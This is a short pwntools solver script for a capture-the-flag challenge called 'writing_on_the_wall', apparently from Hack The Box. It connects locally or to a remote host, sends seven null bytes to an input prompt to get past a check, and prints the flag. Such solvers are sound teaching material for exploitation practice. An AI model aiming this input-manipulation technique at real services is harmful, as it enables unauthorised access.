#!/usr/bin/python3
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'

fname = './writing_on_the_wall' 

os.system('clear')

if len(sys.argv) < 2:
  print('Running solver locally..\n')
  # r    = process(fname)
  r = gdb.debug(fname, gdbscript='break main\ncontinue')
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP} {PORT}\n')

r.sendlineafter('out?', "\x00"*7)

# Get flag
pause(1)
print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
